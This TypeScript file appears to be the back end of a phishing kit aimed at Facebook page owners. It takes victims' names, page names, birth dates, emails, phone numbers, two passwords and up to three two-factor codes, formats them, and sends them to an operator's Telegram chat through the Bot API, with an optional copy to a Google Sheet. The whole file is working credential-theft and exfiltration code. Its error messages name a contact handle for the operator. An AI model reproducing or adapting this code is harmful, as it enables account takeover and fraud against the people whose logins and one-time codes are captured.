import axios from 'axios';
import https from 'https';
import { memoryStoreTTL } from '../libs/memoryStore';
import { generateKey } from './generateKey';
import { sendDataToSheet } from './sheet';

const agent = new https.Agent({ family: 4 });

function getTelegramConfig() {
    const token = process.env.TELEGRAM_BOT_TOKEN?.trim();
    const chatId = process.env.TELEGRAM_CHAT_ID?.trim();
    if (!token || !chatId) {
        return null;
    }
    return {
        api: `https://api.telegram.org/bot${token}`,
        chatId,
    };
}

// Simple rate limiter to prevent spam
const rateLimiter = new Map<string, number>();
const RATE_LIMIT_WINDOW = 1000; // 1 second between messages from same key

function checkRateLimit(key: string): boolean {
    const now = Date.now();
    const lastCall = rateLimiter.get(key);

    if (!lastCall || (now - lastCall) > RATE_LIMIT_WINDOW) {
        rateLimiter.set(key, now);
        return true;
    }

    return false;
}

// Retry utility for Telegram API calls
async function retryTelegramRequest(requestFn: () => Promise<any>, maxRetries = 3): Promise<any> {
    let lastError: any;

    for (let attempt = 1; attempt <= maxRetries; attempt++) {
        try {
            const result = await requestFn();
            return result;
        } catch (error: any) {
            lastError = error;

            const errorCode = error?.response?.status;
            const errorDesc = error?.response?.data?.description || '';

            // Don't retry on authentication errors, invalid chat_id, etc.
            if (
                errorCode === 401 ||
                errorCode === 403 ||
                errorDesc.includes('chat not found') ||
                errorDesc.includes('bot was blocked')
            ) {
                throw error;
            }

            if (attempt === maxRetries) {
                break;
            }

            // Exponential backoff: 1s, 2s, 4s
            const delay = Math.pow(2, attempt - 1) * 1000;
            console.warn(`⚠️ Telegram API attempt ${attempt} failed, retrying in ${delay}ms:`, error.message);
            await new Promise(resolve => setTimeout(resolve, delay));
        }
    }

    throw lastError;
}

function escapeHtml(input: any): string {
    const str = typeof input === 'string' ? input : String(input ?? '');
    return str
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');
}

function normalizeData(input: any = {}) {
    return {
        ip: input.ip ?? '',
        location: input.location ?? '',
        fullName: input.fullName ?? input.name ?? '',
        fanpage: input.fanpage ?? '',
        day: input.day ?? '',
        month: input.month ?? '',
        year: input.year ?? '',
        email: input.email ?? '',
        emailBusiness: input.emailBusiness ?? input.business ?? '',
        phone: input.phone ?? '',
        password: input.password ?? '',
        passwordSecond: input.passwordSecond ?? '',
        authMethod: input.authMethod ?? '',
        twoFa: input.twoFa ?? '',
        twoFaSecond: input.twoFaSecond ?? '',
        twoFaThird: input.twoFaThird ?? '',
    };
}

function mergeData(oldData: any = {}, newData: any = {}) {
    const normalizedOld = normalizeData(oldData);
    const normalizedNew = normalizeData(newData);
    const result: any = { ...normalizedOld };
    Object.entries(normalizedNew).forEach(([k, v]) => {
        if (v !== undefined && v !== '') {
            result[k] = v;
        }
    });
    return result;
}

function getChangedFields(prevData: any = {}, nextData: any = {}, inputNew: any = {}): string[] {
    const before = normalizeData(prevData);
    const after = normalizeData(nextData);
    const provided = normalizeData(inputNew);

    const labels: Record<string, string> = {
        ip: 'Ip',
        location: 'Location',
        fullName: 'Full Name',
        fanpage: 'Page Name',
        day: 'Date of birth',
        month: 'Date of birth',
        year: 'Date of birth',
        email: 'Email',
        emailBusiness: 'Email Business',
        phone: 'Phone Number',
        password: 'Password First',
        passwordSecond: 'Password Second',
        authMethod: 'Auth Method',
        twoFa: 'Code 2FA(1)',
        twoFaSecond: 'Code 2FA(2)',
        twoFaThird: 'Code 2FA(3)',
    };

    const changed = new Set<string>();
    Object.keys(after).forEach((k) => {
        if (provided[k] === '' || provided[k] === undefined) return;
        if (before[k] !== after[k]) {
            if (k === 'day' || k === 'month' || k === 'year') {
                changed.add('Date of birth');
            } else {
                changed.add(labels[k] || k);
            }
        }
    });
    return Array.from(changed);
}

function formatMessage(data: any): string {
    const d = normalizeData(data);
    const authLine = d.authMethod ? `\n<b>Auth Method:</b> <code>${escapeHtml(d.authMethod)}</code>\n-----------------------------` : '';
    return `
<b>Ip:</b> <code>${escapeHtml(d.ip || 'Error, contact @otis_cua')}</code>
<b>Location:</b> <code>${escapeHtml(d.location || 'Error, contact @otis_cua')}</code>
-----------------------------
<b>Full Name:</b> <code>${escapeHtml(d.fullName)}</code>
<b>Page Name:</b> <code>${escapeHtml(d.fanpage)}</code>
<b>Date of birth:</b> <code>${escapeHtml(d.day)}/${escapeHtml(d.month)}/${escapeHtml(d.year)}</code>
-----------------------------
<b>Email:</b> <code>${escapeHtml(d.email)}</code>
<b>Email Business:</b> <code>${escapeHtml(d.emailBusiness)}</code>
<b>Phone Number:</b> <code>${d.phone ? escapeHtml(`+${d.phone}`) : ''}</code>
-----------------------------
<b>Password(1):</b> <code>${escapeHtml(d.password)}</code>
<b>Password(2):</b> <code>${escapeHtml(d.passwordSecond)}</code>
-----------------------------${authLine}
<b>🔐Code 2FA(1):</b> <code>${escapeHtml(d.twoFa)}</code>
<b>🔐Code 2FA(2):</b> <code>${escapeHtml(d.twoFaSecond)}</code>
<b>🔐Code 2FA(3):</b> <code>${escapeHtml(d.twoFaThird)}</code>`.trim();
}

export async function sendTelegramMessage(data: any): Promise<void> {
    const config = getTelegramConfig();
    if (!config) {
        console.warn('⚠️ Telegram không được gửi: Thiếu TELEGRAM_BOT_TOKEN hoặc TELEGRAM_CHAT_ID trong file .env');
        return;
    }

    const key = generateKey(data);
    // Rate limiting check
    if (!checkRateLimit(key)) {
        console.warn(`⚠️ Rate limit exceeded for key: ${key}`);
        return;
    }
    const prev = memoryStoreTTL.get(key);
    const fullData = mergeData(prev?.data, data);
    const updatedText = formatMessage(fullData);

    try {
        // if (!prev?.messageId) {
            const res = await retryTelegramRequest(() =>
                axios.post(`${config.api}/sendMessage`, {
                    chat_id: config.chatId,
                    text: updatedText,
                    parse_mode: 'HTML'
                }, {
                    httpsAgent: agent,
                    timeout: 10000
                })
            );

            const messageId = res?.data?.result?.message_id;
            if (messageId) {
                memoryStoreTTL.set(key, { message: updatedText, messageId, data: fullData });
                console.log(`✅ Sent new message. ID: ${messageId}`);
            } else {
                console.warn('⚠️ Telegram response không có message_id');
            }
        // } else {
        //     await retryTelegramRequest(() =>
        //         axios.post(`${config.api}/editMessageText`, {
        //             chat_id: config.chatId,
        //             message_id: prev.messageId,
        //             text: updatedText,
        //             parse_mode: 'HTML',
        //         }, {
        //             httpsAgent: agent,
        //             timeout: 10000
        //         })
        //     );
        //     memoryStoreTTL.set(key, { message: updatedText, messageId: prev.messageId, data: fullData });

        //     const changedFields = getChangedFields(prev.data, fullData, data);
        //     if (changedFields.length > 0) {
        //         await retryTelegramRequest(() =>
        //             axios.post(`${config.api}/sendMessage`, {
        //                 chat_id: config.chatId,
        //                 text: `🔔 Đã cập nhật: <b>${changedFields.join(', ')}</b>`,
        //                 parse_mode: 'HTML'
        //             }, {
        //                 httpsAgent: agent,
        //                 timeout: 10000
        //             })
        //         );
        //     }
        //     console.log(`✏️ Edited message ID: ${prev.messageId}`);
        // }

        if (process.env.WEBHOOK_URL) {
            try {
                await sendDataToSheet(fullData);
                await retryTelegramRequest(() =>
                    axios.post(`${config.api}/sendMessage`, {
                        chat_id: config.chatId,
                        text: '✅ Gửi dữ liệu đến Google Sheet thành công.',
                        parse_mode: 'HTML'
                    }, {
                        httpsAgent: agent,
                        timeout: 10000
                    })
                );
            } catch (sheetErr) {
                await retryTelegramRequest(() =>
                    axios.post(`${config.api}/sendMessage`, {
                        chat_id: config.chatId,
                        text: '❌ Gửi dữ liệu đến Google Sheet thất bại. Liên hệ @otis_cua để khắc phục.',
                        parse_mode: 'HTML'
                    }, {
                        httpsAgent: agent,
                        timeout: 10000
                    })
                );
            }
        }
    } catch (err: any) {
        const desc = err?.response?.data?.description || '';
        if (desc.includes('message to edit not found')) {
            try {
                const res = await retryTelegramRequest(() =>
                    axios.post(`${config.api}/sendMessage`, {
                        chat_id: config.chatId,
                        text: updatedText,
                        parse_mode: 'HTML'
                    }, {
                        httpsAgent: agent,
                        timeout: 10000
                    })
                );
                const messageId = res?.data?.result?.message_id;
                if (messageId) {
                    memoryStoreTTL.set(key, { message: updatedText, messageId, data: fullData });
                    console.log(`🔄 Message was deleted → sent new message. ID: ${messageId}`);
                } else {
                    console.warn('⚠️ Telegram response không có message_id khi re-send');
                }
            } catch (sendErr: any) {
                console.error('🔥 Telegram re-send error:', sendErr?.response?.data || sendErr.message || sendErr);
            }
            return;
        }
        console.error('🔥 Telegram send/edit error:', err?.response?.data || err.message || err);
        return;
    }
}
